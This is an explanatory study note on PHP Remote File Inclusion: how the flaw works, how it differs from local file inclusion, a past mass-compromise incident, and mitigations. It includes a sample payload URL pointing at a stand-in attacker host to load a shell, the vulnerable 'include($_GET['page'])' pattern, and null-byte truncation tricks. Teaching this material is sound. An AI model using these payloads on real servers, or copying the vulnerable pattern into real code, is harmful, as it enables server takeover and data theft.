# PHP Remote File Inclusion

## What it is
Imagine a librarian who, when asked to read page 47, walks outside and fetches whatever pamphlet a stranger on the street hands them — then reads it aloud to everyone. Remote File Inclusion (RFI) is a web vulnerability where a PHP application accepts a URL as input to a `include()` or `require()` function, causing the server to fetch and execute code hosted on an attacker-controlled remote server.

## Why it matters
In 2011, attackers exploited RFI vulnerabilities in the Joomla and WordPress ecosystems to mass-compromise thousands of shared hosting servers, injecting web shells that established persistent botnets. A single vulnerable `include($_GET['page'])` parameter gave attackers full server-side code execution — not just data theft — because the remote file runs with the permissions of the web server process itself.

## Key facts
- RFI requires PHP's `allow_url_include` directive to be **On** (disabled by default since PHP 5.2.0 — many exam questions hinge on this)
- The payload is executed **server-side**, meaning an attacker can drop web shells, exfiltrate `/etc/passwd`, or pivot to internal networks
- Distinguished from **Local File Inclusion (LFI)**: RFI fetches external URLs; LFI traverses the local filesystem — both abuse the same vulnerable `include()` pattern
- Common payloads end in `?` or `%00` (null byte) to truncate forced file extensions appended by the application (e.g., `http://evil.com/shell.txt?`)
- Mitigations: disable `allow_url_include`, validate/whitelist all file path inputs, use static includes instead of dynamic user-controlled parameters

## Related concepts
[[Local File Inclusion]] [[PHP Code Injection]] [[Web Shell]] [[Input Validation]] [[Directory Traversal]]